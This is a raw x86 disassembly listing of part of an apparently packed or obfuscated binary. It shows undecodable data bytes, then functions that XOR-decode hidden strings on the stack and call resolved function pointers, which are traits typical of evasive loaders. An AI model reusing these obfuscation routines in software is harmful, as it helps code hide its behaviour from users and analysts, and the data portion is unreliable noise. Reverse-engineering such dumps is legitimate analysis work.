  423b1d:	push   ecx
  423b1e:	add    esi,DWORD PTR [esi-0x4f05bfc8]
  423b24:	mov    al,BYTE PTR [edx-0x5f]
  423b27:	push   ecx
  423b28:	sub    ebp,DWORD PTR [ebx+0x3e]
  423b2b:	cs sbb cl,al
  423b2e:	(bad)
  423b32:	push   ss
  423b33:	int    0xe3
  423b35:	sahf   
  423b36:	inc    ecx
  423b37:	repz push ebp
  423b39:	cmp    DWORD PTR [edx+0x19],edx
  423b3c:	ror    dl,0xb9
  423b3f:	and    BYTE PTR [ebx],0xeb
  423b42:	jmp    FWORD PTR [ebx]
  423b44:	test   eax,0xf1862e39
  423b49:	add    BYTE PTR [edi-0xc],0x8d
  423b4d:	jae    0x423b23
  423b4f:	je     0x423b45
  423b51:	(bad)  
  423b52:	in     eax,dx
  423b53:	icebp  
  423b54:	sub    DWORD PTR ds:0x5f04115f,ecx
  423b5a:	arpl   WORD PTR [eax-0x5],di
  423b5d:	mov    ch,0x34
  423b5f:	push   eax
  423b60:	cmp    eax,0x142c2b78
  423b65:	add    edi,DWORD PTR [ebx-0x5bf42c48]
  423b6b:	mov    ecx,DWORD PTR [esi]
  423b6d:	xor    DWORD PTR [ebx],ebx
  423b6f:	das    
  423b70:	mov    ah,BYTE PTR [esi+0x42]
  423b73:	popa   
  423b74:	mov    eax,ds:0xf55b59e6
  423b79:	ds call 0xe04b:0xc30b7ccd
  423b81:	sbb    DWORD PTR ds:0x3e2e2039,edi
  423b87:	ins    BYTE PTR es:[edi],dx
  423b88:	out    dx,eax
  423b89:	pop    edi
  423b8a:	and    edx,DWORD PTR [ebx-0x773d5]
  423b90:	jae    0x423bd9
  423b92:	fwait
  423b93:	cwde   
  423b94:	clc    
  423b95:	rcl    DWORD PTR [esi+ebx*1+0x2a],cl
  423b99:	xchg   ebx,eax
  423b9a:	sub    BYTE PTR [ebp+0x660e9133],cl
  423ba0:	je     0x423b7d
  423ba2:	js     0x423b86
  423ba4:	mov    al,ds:0x2aab160b
  423ba9:	scas   eax,DWORD PTR es:[edi]
  423baa:	iret   
  423bab:	bound  ebx,QWORD PTR [edx+edi*8+0x2f]
  423baf:	xchg   ebx,eax
  423bb0:	xor    cl,bl
  423bb2:	stc    
  423bb3:	test   ebp,esi
  423bb5:	fisubr WORD PTR [edx+0x5ade6682]
  423bbb:	das    
  423bbc:	retf   0x4d01
  423bbf:	cs adc al,bl
  423bc2:	fild   QWORD PTR [edi]
  423bc4:	aam    0xc8
  423bc6:	mov    dl,0x6
  423bc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bc9:	(bad)  
  423bca:	ficom  DWORD PTR [ebx]
  423bcc:	pop    esi
  423bcd:	mov    al,0xf1
  423bcf:	cmp    bh,BYTE PTR [eax+0x4f2e7d6a]
  423bd5:	(bad)
  423bdb:	mov    eax,0xfc58f598
  423be0:	and    edi,DWORD PTR [esp+ebx*8-0x76311dd2]
  423be7:	shr    DWORD PTR ds:0xf1919d4c,1
  423bed:	and    DWORD PTR [ebp-0x7fb88ed7],0x632d4062
  423bf7:	(bad)  
  423bf8:	and    al,0x0
  423bfa:	sub    edi,DWORD PTR [ebx+0xc6be3ad]
  423c00:	mov    eax,0xf10f3362
  423c05:	repz add eax,0xdef5867b
  423c0b:	mov    ds:0x544f3d18,al
  423c10:	pop    esi
  423c11:	mov    dl,0x29
  423c13:	sbb    dl,BYTE PTR [ecx]
  423c15:	mov    al,ds:0x701e06eb
  423c1a:	cmp    BYTE PTR [edx],bl
  423c1c:	push   ecx
  423c1d:	mov    al,ds:0xd34ee35f
  423c22:	pop    es
  423c23:	jmp    0x18b0:0x12ad70a3
  423c2a:	loope  0x423c7c
  423c2c:	sbb    ah,BYTE PTR ds:0x3dfd651a
  423c32:	fs out 0x3a,eax
  423c35:	cmp    eax,0x6346f23
  423c3a:	out    dx,eax
  423c3b:	in     eax,dx
  423c3c:	mov    ecx,0xf6cf6631
  423c41:	fcmovu st,st(6)
  423c43:	inc    ebx
  423c44:	push   cs
  423c45:	cmc    
  423c46:	mov    esi,0x6d07d2ed
  423c4b:	jnp    0x423bda
  423c4d:	jo     0x423cc3
  423c4f:	xchg   DWORD PTR [edx+0x3fd008c3],edi
  423c55:	mov    ds:0x4b843ba5,eax
  423c5a:	int3   
  423c5b:	es mov ecx,0xb805a721
  423c61:	or     cl,BYTE PTR [edi]
  423c63:	mov    ah,0xf
  423c65:	mov    ah,0x20
  423c67:	popf   
  423c68:	test   BYTE PTR [edi-0x28],ah
  423c6b:	scas   eax,DWORD PTR es:[edi]
  423c6c:	(bad)  
  423c6d:	(bad)  
  423c6e:	ss cld 
  423c70:	jb     0x423c5b
  423c72:	rol    BYTE PTR [edi+ebp*1],1
  423c75:	clc    
  423c76:	sbb    al,0x42
  423c78:	or     BYTE PTR [eax-0x50],0xbd
  423c7c:	sub    eax,0x927104e0
  423c81:	xchg   eax,ebx
  423c83:	dec    edx
  423c84:	(bad)  
  423c85:	imul   ebx,DWORD PTR [eax+0x1ab332a9],0x77
  423c8c:	or     al,al
  423c8e:	mov    cl,0x62
  423c91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c92:	jmp    0xba7a:0x891db57c
  423c99:	loop   0x423ce7
  423c9b:	and    al,BYTE PTR ds:[ecx]
  423c9e:	jl     0x423d00
  423ca0:	neg    BYTE PTR [ecx+edi*8]
  423ca3:	jbe    0x423c86
  423ca5:	pop    eax
  423ca6:	out    dx,al
  423ca7:	push   es
  423ca8:	enter  0x8cdd,0x1d
  423cac:	rcr    BYTE PTR [esp+edx*2],cl
  423caf:	pop    ds
  423cb0:	outs   dx,DWORD PTR ds:[esi]
  423cb1:	mov    WORD PTR [edx+0x48],cs
  423cb4:	xor    ebx,DWORD PTR [ebp-0x75]
  423cb7:	mov    ebx,0x5d589c06
  423cbc:	push   esi
  423cbd:	repz cmp edi,0xfe3ea168
  423cc4:	push   esi
  423cc5:	je     0x423d0c
  423cc7:	sar    BYTE PTR [eax],cl
  423cc9:	adc    DWORD PTR [esi-0x3e],esi
  423ccc:	test   cl,0xa1
  423ccf:	mov    ch,0x30
  423cd1:	in     al,dx
  423cd2:	cmp    BYTE PTR [edi+0x31],ch
  423cd5:	sub    al,0x9b
  423cd7:	fdivr  st(4),st
  423cd9:	fdivr  DWORD PTR [ebx+edx*2]
  423cdc:	xor    eax,0xd64c066c
  423ce1:	icebp  
  423ce2:	push   edi
  423ce3:	rcl    DWORD PTR [ebx-0x7b1527d],1
  423ce9:	adc    eax,0x571f24e8
  423cee:	call   0x4a79:0xf47405ce
  423cf5:	xor    al,0xa1
  423cf7:	mov    ds:0x855c714f,al
  423cfc:	sti    
  423cfd:	push   esi
  423cfe:	leave  
  423cff:	mov    WORD PTR [ebx-0x67],?
  423d02:	cmp    DWORD PTR [ebp+esi*2+0x4bf586e3],0x65
  423d0a:	push   edi
  423d0b:	jg     0x423c93
  423d0d:	pop    eax
  423d0e:	pop    es
  423d0f:	lods   al,BYTE PTR ds:[esi]
  423d10:	sub    ebp,DWORD PTR [esi]
  423d12:	push   ebp
  423d13:	xchg   edx,eax
  423d14:	mov    bl,0xfd
  423d16:	pusha  
  423d17:	jmp    0x423ca2
  423d19:	jl     0x423d25
  423d1b:	std    
  423d1c:	cmp    eax,0x2898cf31
  423d21:	xchg   ecx,eax
  423d22:	das    
  423d23:	pop    eax
  423d24:	hlt    
  423d25:	retf   
  423d26:	push   esi
  423d27:	ins    BYTE PTR es:[edi],dx
  423d28:	push   esp
  423d29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d2a:	push   0x1adaf1a0
  423d2f:	mov    bl,0xa3
  423d31:	dec    ebp
  423d32:	mov    edi,0x7d70bc27
  423d37:	ret    
  423d38:	push   ebx
  423d39:	stc    
  423d3a:	mov    bh,0xf1
  423d3c:	lahf   
  423d3d:	mov    cl,0xdc
  423d3f:	lea    edx,[edi]
  423d41:	bswap  edi
  423d43:	sbb    cl,BYTE PTR [ebx]
  423d45:	mov    ebx,0x9d7d20c8
  423d4a:	in     eax,dx
  423d4b:	rol    DWORD PTR [ebx+0x3e],cl
  423d4e:	xchg   ebp,eax
  423d4f:	aam    0x4f
  423d51:	or     bh,al
  423d53:	out    dx,al
  423d54:	sbb    al,0x34
  423d56:	ja     0x423d36
  423d58:	lea    ebx,[edi*2-0x73b460b1]
  423d5f:	call   0xf66c:0x116af5c0
  423d66:	scas   al,BYTE PTR es:[edi]
  423d67:	fbld   TBYTE PTR [eax-0x67]
  423d6a:	mov    WORD PTR [ebx+ecx*4+0x5d],gs
  423d6e:	xor    dh,BYTE PTR [esi+0x4f853e5f]
  423d74:	out    dx,eax
  423d75:	add    DWORD PTR [esi-0x6],eax
  423d78:	imul   ebp,DWORD PTR [edi+0x4b],0xffffff84
  423d7c:	add    al,BYTE PTR [esi+ecx*8]
  423d7f:	sub    al,0x13
  423d81:	icebp  
  423d82:	dec    ecx
  423d83:	popf   
  423d84:	cmp    esp,ebp
  423d86:	lahf   
  423d87:	cmp    eax,0xdc3ed1ba
  423d8c:	mov    dl,0xc4
  423d8e:	push   ss
  423d8f:	inc    eax
  423d90:	pop    ebx
  423d91:	popa   
  423d92:	push   ds
  423d93:	jnp    0x423d2f
  423d95:	mov    ebp,DWORD PTR [ebp-0x67]
  423d98:	test   al,0x36
  423d9a:	push   0xffffffc7
  423d9c:	xchg   esp,eax
  423d9d:	or     eax,0x5d9ed922
  423da2:	vpand  xmm2,xmm3,XMMWORD PTR [ebx+0x50022283]
  423daa:	cdq    
  423dab:	stos   DWORD PTR es:[edi],eax
  423dac:	mov    WORD PTR [esi-0x60],ds
  423daf:	or     DWORD PTR [ebx],ecx
  423db1:	adc    ah,0x32
  423db4:	in     eax,dx
  423db5:	fld    DWORD PTR [edi-0x24]
  423db8:	in     al,0x9a
  423dba:	jns    0x423e14
  423dbc:	es (bad) 
  423dbe:	jno    0x423dbc
  423dc0:	es or  eax,0xe4aba262
  423dc6:	xchg   ecx,eax
  423dc7:	fs pop ebp
  423dc9:	or     cl,ah
  423dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dcc:	ds cmp eax,0x64c1c5b1
  423dd2:	std    
  423dd3:	jb     0x423d91
  423dd5:	inc    eax
  423dd6:	cmp    DWORD PTR [esi+eiz*4+0x8],esp
  423dda:	and    bl,dh
  423ddc:	int3   
  423ddd:	or     eax,0xac6f895f
  423de2:	cmc    
  423de3:	icebp  
  423de4:	hlt    
  423de5:	push   ebp
  423de6:	push   esi
  423de7:	xchg   BYTE PTR [edx],dl
  423de9:	inc    ecx
  423dea:	and    BYTE PTR [esp+eax*4+0x2ed53a45],bh
  423df1:	jge    0x423df8
  423df3:	ds adc eax,0x943d9f9f
  423df9:	cmp    DWORD PTR [edi],esi
  423dfb:	outs   dx,DWORD PTR ds:[esi]
  423dfc:	cwde   
  423dfd:	int3   
  423dfe:	arpl   ax,sp
  423e00:	or     dl,dl
  423e02:	mov    eax,DWORD PTR [ebp+0x8]
  423e05:	movsx  eax,BYTE PTR [eax]
  423e08:	mov    edx,0x3272f6
  423e0d:	sub    eax,edx
  423e0f:	mov    ecx,0x75108af
  423e14:	xor    eax,ecx
  423e16:	cmp    eax,0xf89c85f8
  423e1b:	mov    DWORD PTR ds:0x428e97,0x5a9f
  423e25:	jne    0x423e8a
  423e2b:	mov    eax,DWORD PTR [ebp+0x8]
  423e2e:	push   esi
  423e2f:	or     DWORD PTR ds:0x428e8b,edx
  423e35:	mov    esi,DWORD PTR [ebp+0x8]
  423e38:	add    esi,DWORD PTR [eax+0x3c]
  423e3b:	sbb    DWORD PTR ds:0x428e23,0x3013
  423e45:	mov    DWORD PTR [ebp+0x8],esi
  423e48:	sbb    DWORD PTR ds:0x428e6b,0x1c7d
  423e52:	mov    eax,DWORD PTR [ebp-0x4]
  423e55:	mov    esi,DWORD PTR ds:0x428e6b
  423e5b:	adc    esi,DWORD PTR ds:0x428e2f
  423e61:	mov    DWORD PTR ds:0x428e6b,esi
  423e67:	mov    esi,DWORD PTR [ebp+0x8]
  423e6a:	adc    DWORD PTR ds:0x428ecf,0x428ea3
  423e74:	xor    eax,ecx
  423e76:	add    eax,edx
  423e78:	cmp    DWORD PTR [esi+0x54],eax
  423e7b:	pop    esi
  423e7c:	je     0x423e8a
  423e82:	mov    eax,DWORD PTR [ebp+0x8]
  423e85:	jmp    0x423e91
  423e8a:	mov    eax,DWORD PTR [ebp-0x4]
  423e8d:	xor    eax,ecx
  423e8f:	add    eax,edx
  423e91:	leave  
  423e92:	ret    0x4
  423e95:	push   ebp
  423e96:	mov    ebp,esp
  423e98:	sub    esp,0xc
  423e9b:	push   esi
  423e9c:	or     DWORD PTR ds:0x428eaf,ebx
  423ea2:	mov    esi,0xf89c85a5
  423ea7:	and    DWORD PTR ds:0x428e97,0x0
  423eb1:	jmp    0x423ec3
  423eb6:	mov    edx,DWORD PTR ds:0x428e97
  423ebc:	inc    edx
  423ebd:	mov    DWORD PTR ds:0x428e97,edx
  423ec3:	cmp    DWORD PTR ds:0x428e97,0x10
  423eca:	jae    0x423f0a
  423ed0:	cmp    DWORD PTR ds:0x428e97,0x8
  423ed7:	jg     0x423f0a
  423edd:	jmp    0x423eeb
  423ee2:	push   DWORD PTR [ebp-0x20]
  423ee5:	call   DWORD PTR ds:0x42aa1b
  423eeb:	cmp    DWORD PTR ds:0x428e97,0x7
  423ef2:	jne    0x423f05
  423ef8:	mov    edx,DWORD PTR ds:0x428e97
  423efe:	inc    edx
  423eff:	mov    DWORD PTR ds:0x428e97,edx
  423f05:	jmp    0x423eb6
  423f0a:	mov    DWORD PTR [ebp-0x8],esi
  423f0d:	and    DWORD PTR ds:0x428e67,0x0
  423f17:	jmp    0x423f29
  423f1c:	mov    edx,DWORD PTR ds:0x428e67
  423f22:	inc    edx
  423f23:	mov    DWORD PTR ds:0x428e67,edx
  423f29:	cmp    DWORD PTR ds:0x428e67,0x1a
  423f30:	jae    0x423f78
  423f36:	cmp    DWORD PTR ds:0x428e67,0x4
  423f3d:	jle    0x423f78
  423f43:	jmp    0x423f59
  423f48:	push   DWORD PTR [ebp-0x18]
  423f4b:	push   0x428e67
  423f50:	push   DWORD PTR [ebp-0x18]
  423f53:	call   DWORD PTR ds:0x42aa1f
  423f59:	cmp    DWORD PTR ds:0x428e67,0x3
  423f60:	jne    0x423f73
  423f66:	mov    edx,DWORD PTR ds:0x428e67
  423f6c:	inc    edx
  423f6d:	mov    DWORD PTR ds:0x428e67,edx
  423f73:	jmp    0x423f1c
  423f78:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  423f7f:	push   edi
  423f80:	adc    DWORD PTR ds:0x428e87,0x34d1
  423f8a:	mov    eax,eax
  423f8c:	mov    eax,DWORD PTR [ebp-0x4]
  423f8f:	movzx  edx,BYTE PTR ds:0x428e97
  423f96:	add    DWORD PTR ds:0x428ecf,edx
  423f9c:	mov    edi,DWORD PTR [ebp-0x8]
  423f9f:	mov    ecx,DWORD PTR ds:0x429727
  423fa5:	mov    ecx,DWORD PTR [ecx]
  423fa7:	sub    DWORD PTR ds:0x428ecb,ecx
  423fad:	mov    ecx,0x75108af
  423fb2:	xor    eax,ecx
  423fb4:	xor    edi,ecx
  423fb6:	mov    edx,0x3272f6
  423fbb:	add    edi,edx
  423fbd:	add    eax,edx
  423fbf:	imul   eax,edi
  423fc2:	mov    edi,DWORD PTR [ebp+0xc]
  423fc5:	cmp    edi,eax
  423fc7:	je     0x42401c
  423fcd:	mov    DWORD PTR [ebp-0xc],esi
  423fd0:	mov    eax,DWORD PTR [ebp-0xc]
  423fd3:	mov    esi,DWORD PTR [ebp+0xc]
  423fd6:	xor    eax,ecx
  423fd8:	lea    eax,[eax*8+0x1939828]
  423fdf:	mov    eax,DWORD PTR [esi+eax*1]
  423fe2:	mov    DWORD PTR [ebp+0xc],eax
  423fe5:	mov    eax,DWORD PTR [ebp-0x4]
  423fe8:	mov    esi,DWORD PTR [ebp-0x8]
  423feb:	xor    eax,ecx
  423fed:	xor    esi,ecx
  423fef:	add    esi,edx
  423ff1:	add    eax,edx
  423ff3:	imul   eax,esi
  423ff6:	mov    esi,DWORD PTR [ebp+0xc]
  423ff9:	cmp    esi,eax
  423ffb:	je     0x42401c
  424001:	mov    eax,DWORD PTR [ebp-0x4]
  424004:	xor    eax,ecx
  424006:	mov    ecx,DWORD PTR [ebp+0xc]
  424009:	add    eax,edx
  42400b:	imul   eax,ecx
  42400e:	add    eax,DWORD PTR [ebp+0x8]
  424011:	mov    DWORD PTR [ebp+0xc],eax
  424014:	mov    eax,DWORD PTR [ebp+0xc]
  424017:	jmp    0x42402d
  42401c:	mov    eax,DWORD PTR [ebp-0x4]
  42401f:	mov    esi,DWORD PTR [ebp-0x8]
  424022:	xor    esi,ecx
  424024:	xor    eax,ecx
  424026:	add    esi,edx
  424028:	add    eax,edx
  42402a:	imul   eax,esi
  42402d:	pop    edi
  42402e:	pop    esi
  42402f:	leave  
  424030:	ret    0x8
	...
  424043:	add    BYTE PTR [ebp-0x44],al
  424046:	mov    edi,0x4d
  42404b:	add    BYTE PTR [edx],al
  42404d:	add    BYTE PTR [eax],al
  42404f:	add    BYTE PTR [ecx+0x0],al
  424052:	add    BYTE PTR [eax],al
  424054:	pusha  
  424055:	inc    eax
  424056:	add    al,BYTE PTR [eax]
  424058:	pusha  
  424059:	xor    al,0x2
  42405b:	add    BYTE PTR [eax],al
  42405d:	add    BYTE PTR [eax],al
  42405f:	add    BYTE PTR [edx+0x53],dl
  424062:	inc    esp
  424063:	push   ebx
  424064:	popa   
  424065:	mov    ds:0x12c9cbcc,eax
  42406a:	add    cl,BYTE PTR [ebx-0x61]
  42406d:	hlt    
  42406e:	std    
  42406f:	mov    esi,0x1bfaec79
  424074:	add    DWORD PTR [eax],eax
  424076:	add    BYTE PTR [eax],al
  424078:	inc    ebx
  424079:	cmp    bl,BYTE PTR [esi+eax*2+0x6f]
  42407d:	ins    BYTE PTR es:[edi],dx
  42407e:	fs gs jb 0x4240a2
  424082:	outs   dx,DWORD PTR ds:[esi]
  424083:	data16 and BYTE PTR [edi+0x6f],dl
  424087:	jb     0x4240f4
  424089:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  424090:	push   0x65
  424092:	arpl   WORD PTR [esp+ebx*2+0x50],si
  424096:	jb     0x424107
  424098:	push   0x65
  42409a:	arpl   WORD PTR [esp+edx*2+0x65],si
  42409e:	jae    0x424114
  4240a0:	add    BYTE PTR [ebx-0x137e13ab],cl
  4240a6:	or     BYTE PTR [ecx],al
  4240a8:	add    BYTE PTR [eax],al
  4240aa:	push   ebx
  4240ab:	mov    eax,ebx
  4240ad:	xchg   ecx,eax
  4240ae:	mov    eax,DWORD PTR [ebp+0x8]
  4240b1:	cmp    eax,0xf89c85a5
  4240b6:	jne    0x424542
  4240bc:	mov    eax,DWORD PTR [ebp+0xc]
  4240bf:	cmp    eax,0xf89c85a4
  4240c4:	jne    0x424542
  4240ca:	mov    eax,DWORD PTR [ebp+0x24]
  4240cd:	mov    DWORD PTR [ebp-0x4],eax
  4240d0:	mov    eax,DWORD PTR [ebp-0x4]
  4240d3:	mov    eax,DWORD PTR [eax+0x1d8]
  4240d9:	mov    eax,DWORD PTR [eax]
  4240db:	mov    eax,DWORD PTR [eax]
  4240dd:	mov    DWORD PTR [ebp-0x8],eax
  4240e0:	mov    BYTE PTR [ebp-0x18],0x1c
  4240e4:	mov    BYTE PTR [ebp-0x17],0x1f
  4240e8:	mov    BYTE PTR [ebp-0x16],0x1a
  4240ec:	mov    BYTE PTR [ebp-0x15],0x50
  4240f0:	mov    BYTE PTR [ebp-0x14],0x51
  4240f4:	mov    BYTE PTR [ebp-0x13],0x83
  4240f8:	mov    BYTE PTR [ebp-0x20],0xe
  4240fc:	mov    BYTE PTR [ebp-0x1f],0x10
  424100:	mov    BYTE PTR [ebp-0x1e],0x1e
  424104:	mov    BYTE PTR [ebp-0x1d],0x11
  424108:	mov    BYTE PTR [ebp-0x1c],0x50
  42410c:	mov    BYTE PTR [ebp-0x1b],0x51
  424110:	mov    BYTE PTR [ebp-0x1a],0x83
  424114:	mov    BYTE PTR [ebp-0x28],0x10
  424118:	mov    BYTE PTR [ebp-0x27],0x1b
  42411c:	mov    BYTE PTR [ebp-0x26],0x17
  424120:	mov    BYTE PTR [ebp-0x25],0xc
  424124:	mov    BYTE PTR [ebp-0x24],0x22
  424128:	mov    BYTE PTR [ebp-0x23],0x13
  42412c:	mov    BYTE PTR [ebp-0x22],0x1a
  424130:	mov    BYTE PTR [ebp-0x21],0x83
  424134:	xor    ecx,ecx
  424136:	lea    eax,[ebp+ecx*1-0x18]
  42413a:	movzx  edx,BYTE PTR [eax]
  42413d:	xor    edx,0x7f
  424140:	add    edx,0x4
  424143:	inc    ecx
  424144:	mov    BYTE PTR [eax],dl
  424146:	cmp    ecx,0x6
  424149:	jb     0x424136
  42414b:	xor    ecx,ecx
  42414d:	lea    eax,[ebp+ecx*1-0x20]
  424151:	movzx  edx,BYTE PTR [eax]
  424154:	xor    edx,0x7f
  424157:	add    edx,0x4
  42415a:	inc    ecx
  42415b:	mov    BYTE PTR [eax],dl
  42415d:	cmp    ecx,0x7
  424160:	jb     0x42414d
  424162:	xor    ecx,ecx
  424164:	lea    eax,[ebp+ecx*1-0x28]
  424168:	movzx  edx,BYTE PTR [eax]
  42416b:	xor    edx,0x7f
  42416e:	add    edx,0x4
  424171:	inc    ecx
  424172:	mov    BYTE PTR [eax],dl
  424174:	cmp    ecx,0x8
  424177:	jb     0x424164
  424179:	lea    eax,[ebp-0x2c]
  42417c:	mov    DWORD PTR [ebp-0x8],eax
  42417f:	mov    ecx,DWORD PTR [ebp-0x8]
  424182:	mov    eax,0x7113fccf
  424187:	push   esi
  424188:	mov    DWORD PTR [ecx],eax
  42418a:	mov    ecx,DWORD PTR [ebp-0x2c]
  42418d:	mov    esi,0x4e38
  424192:	push   edi
  424193:	lea    edi,[esi-0x6]
  424196:	mov    ebx,0x3272f6
  42419b:	cmp    ecx,eax
  42419d:	jne    0x42426e
  4241a3:	lea    eax,[esi+0x3f]
  4241a6:	mov    WORD PTR [ebp-0x78],ax
  4241aa:	mov    eax,esi
  4241ac:	mov    WORD PTR [ebp-0x76],ax
  4241b0:	add    eax,0x45
  4241b3:	mov    WORD PTR [ebp-0x74],ax
  4241b7:	lea    eax,[esi+0x6]
  4241ba:	mov    WORD PTR [ebp-0x72],ax
  4241be:	add    eax,0x41
  4241c1:	mov    WORD PTR [ebp-0x70],ax
  4241c5:	mov    eax,edi
  4241c7:	mov    WORD PTR [ebp-0x6e],ax
  4241cb:	mov    eax,0x4f94
  4241d0:	mov    WORD PTR [ebp-0x6c],ax
  4241d4:	lea    eax,[esi-0x7]
  4241d7:	mov    WORD PTR [ebp-0x6a],ax
  4241db:	add    eax,0x30
  4241de:	mov    WORD PTR [ebp-0x68],ax
  4241e2:	lea    eax,[esi-0x3]
  4241e5:	mov    WORD PTR [ebp-0x66],ax
  4241e9:	mov    eax,esi
  4241eb:	mov    WORD PTR [ebp-0x64],ax
  4241ef:	add    eax,0xfffffffc
  4241f2:	mov    WORD PTR [ebp-0x62],ax
  4241f6:	mov    eax,0x443
  4241fb:	mov    WORD PTR [ebp-0x60],ax
  4241ff:	mov    eax,0x5672
  424204:	mov    WORD PTR [ebp-0x5e],ax
  424208:	mov    eax,0x6112
  42420d:	mov    WORD PTR [ebp-0x5c],ax
  424211:	mov    eax,0xf1e0
  424216:	mov    WORD PTR [ebp-0x5a],ax
  42421a:	mov    eax,edi
  42421c:	mov    WORD PTR [ebp-0x58],ax
  424220:	lea    eax,[ebp-0xe0]
  424226:	push   eax
  424227:	mov    eax,DWORD PTR [ebp+0xc]
  42422a:	xor    eax,0x75108af
  42422f:	add    eax,ebx
  424231:	push   eax
  424232:	lea    eax,[ebp-0x78]
  424235:	push   eax
  424236:	mov    eax,DWORD PTR [ebp-0x4]
  424239:	mov    eax,DWORD PTR [eax+0x198]
  42423f:	mov    DWORD PTR [ebp-0xe0],0x1
  424249:	mov    DWORD PTR [ebp-0xdc],0xffff
  424253:	push   DWORD PTR [eax]
  424255:	mov    eax,DWORD PTR [ebp+0x10]
  424258:	call   eax
  42425a:	mov    DWORD PTR [ebp-0x8],eax
  42425d:	mov    eax,DWORD PTR [ebp-0x8]
  424260:	test   eax,eax
  424262:	je     0x42426e
  424264:	xor    DWORD PTR ds:0xe041cc1,0x9f170bd0
  42426e:	mov    eax,DWORD PTR [ebp-0x4]
  424271:	mov    ecx,DWORD PTR [eax+0x18c]
  424277:	xor    eax,eax
  424279:	cmp    DWORD PTR [ecx],eax
  42427b:	jne    0x4244b2
  424281:	mov    ecx,DWORD PTR [ebp-0x4]
  424284:	mov    ecx,DWORD PTR [ecx+0x17c]
  42428a:	mov    DWORD PTR [ecx],eax
  42428c:	mov    ecx,DWORD PTR [ebp-0x4]
  42428f:	mov    ecx,DWORD PTR [ecx+0x180]
  424295:	mov    DWORD PTR [ecx],eax
  424297:	mov    eax,0x4e6d
  42429c:	mov    WORD PTR [ebp-0x9c],ax
  4242a3:	mov    eax,esi
  4242a5:	mov    WORD PTR [ebp-0x9a],ax
  4242ac:	mov    eax,0x4e7d
  4242b1:	mov    WORD PTR [ebp-0x98],ax
  4242b8:	add    eax,0xffffffc0
  4242bb:	mov    WORD PTR [ebp-0x96],ax
  4242c2:	mov    eax,0x4f88
  4242c7:	mov    WORD PTR [ebp-0x94],ax
  4242ce:	mov    eax,0x4e3c
  4242d3:	mov    WORD PTR [ebp-0x92],ax
  4242da:	mov    eax,esi
  4242dc:	mov    WORD PTR [ebp-0x8c],ax
  4242e3:	mov    eax,0x4e31
  4242e8:	mov    WORD PTR [ebp-0x8a],ax
  4242ef:	mov    eax,0x99fd
  4242f4:	mov    WORD PTR [ebp-0x88],ax
  4242fb:	mov    eax,0x8d6c
  424300:	mov    WORD PTR [ebp-0x86],ax
  424307:	mov    eax,0xd66f
  42430c:	mov    WORD PTR [ebp-0x84],ax
  424313:	mov    BYTE PTR [ebp-0x10],0x10
  424317:	mov    eax,0xd783
  42431c:	mov    WORD PTR [ebp-0x82],ax
  424323:	mov    BYTE PTR [ebp-0xf],0x1b
  424327:	mov    eax,0x2782
  42432c:	mov    BYTE PTR [ebp-0xe],0x17
  424330:	mov    WORD PTR [ebp-0x80],ax
  424334:	mov    BYTE PTR [ebp-0xd],0xc
  424338:	mov    eax,0x4782
  42433d:	mov    BYTE PTR [ebp-0xc],0x22
  424341:	mov    WORD PTR [ebp-0x7e],ax
  424345:	mov    eax,0x4e33
  42434a:	mov    BYTE PTR [ebp-0xb],0x13
  42434e:	push   0x8
  424350:	mov    BYTE PTR [ebp-0xa],0x1a
  424354:	mov    WORD PTR [ebp-0x7c],ax
  424358:	mov    BYTE PTR [ebp-0x9],0x83
  42435c:	mov    DWORD PTR [ebp-0x90],0x4e324e61
  424366:	lea    eax,[ebp-0x10]
  424369:	pop    edi
  42436a:	movzx  ecx,BYTE PTR [eax]
  42436d:	xor    ecx,0x7f
  424370:	add    ecx,0x4
  424373:	mov    BYTE PTR [eax],cl
  424375:	inc    eax
  424376:	dec    edi
  424377:	jne    0x42436a
  424379:	mov    DWORD PTR [ebp-0xe0],0x1
  424383:	lea    eax,[ebp-0x10]
  424386:	mov    DWORD PTR [ebp-0xdc],eax
  42438c:	mov    ecx,0x4e60
  424391:	mov    eax,ecx
  424393:	mov    WORD PTR [ebp-0x40],ax
  424397:	add    eax,0xb
  42439a:	mov    edx,eax
  42439c:	mov    WORD PTR [ebp-0x3e],dx
  4243a0:	mov    edx,0x4f93
  4243a5:	mov    WORD PTR [ebp-0x3c],dx
  4243a9:	add    edx,0xfffffff8
  4243ac:	mov    WORD PTR [ebp-0x3a],dx
  4243b0:	mov    edx,0x4f89
  4243b5:	mov    WORD PTR [ebp-0x38],dx
  4243b9:	add    edx,0x5
  4243bc:	mov    WORD PTR [ebp-0x36],dx
  4243c0:	mov    edx,0x4f87
  4243c5:	mov    WORD PTR [ebp-0x34],dx
  4243c9:	mov    WORD PTR [ebp-0x32],cx
  4243cd:	mov    ecx,esi
  4243cf:	mov    WORD PTR [ebp-0x30],cx
  4243d3:	lea    ecx,[edx-0x7]
  4243d6:	mov    edx,ecx
  4243d8:	mov    WORD PTR [ebp-0x54],dx
  4243dc:	mov    edx,eax
  4243de:	mov    WORD PTR [ebp-0x52],dx
  4243e2:	mov    edx,0x4e73
  4243e7:	mov    WORD PTR [ebp-0x50],dx
  4243eb:	mov    WORD PTR [ebp-0x4e],ax
  4243ef:	lea    eax,[edx-0xa]
  4243f2:	mov    WORD PTR [ebp-0x4c],ax
  4243f6:	add    eax,0x5
  4243f9:	mov    WORD PTR [ebp-0x4a],ax
  4243fd:	lea    eax,[edx-0xc]
  424400:	mov    WORD PTR [ebp-0x48],ax
  424404:	mov    WORD PTR [ebp-0x46],cx
  424408:	mov    WORD PTR [ebp-0x44],si
  42440c:	mov    ecx,DWORD PTR [ebp+0x8]
  42440f:	movzx  edx,WORD PTR [ebp-0x54]
  424413:	mov    eax,0x75108af
  424418:	xor    ecx,eax
  42441a:	add    ecx,ebx
  42441c:	xor    ecx,edx
  42441e:	mov    WORD PTR [ebp-0x54],cx
  424422:	mov    ecx,DWORD PTR [ebp+0x8]
  424425:	xor    ecx,eax
  424427:	movzx  eax,WORD PTR [ebp-0x40]
  42442b:	add    ecx,ebx
  42442d:	xor    ecx,eax
  42442f:	xor    eax,eax
  424431:	mov    WORD PTR [ebp-0x40],cx
  424435:	mov    WORD PTR [ebp-0xf4],ax
  42443c:	mov    WORD PTR [ebp-0x108],ax
